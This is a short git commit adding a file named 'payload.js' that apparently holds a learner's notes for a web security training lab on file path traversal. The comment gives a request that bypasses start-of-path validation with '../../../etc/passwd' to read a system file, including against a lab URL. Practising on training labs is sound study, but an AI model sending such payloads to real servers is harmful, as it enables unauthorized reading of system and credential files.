a6d28361519d74e5c089d2694173e52242baf9aa
Pranjal <pranjalruhela2811@gmail.com>
2023-07-08 11:00:10 +0530

    absolute start of file path validation

---
+++ FilePathTraversal/validation of start of path/payload.js
@@ -0,0 +1,8 @@
+/*
+the question is where are images stored in which directory on the server
+
+
+GET /image?filename=/var/www/images/70.jpg   modify this
+GET /image?filename=/var/www/images/../../../etc/passwd
+https://0a88009a04030a1b846d8d1500dd00cd.web-security-academy.net/image?filename=/var/www/images/../../../etc/passwd
+*/
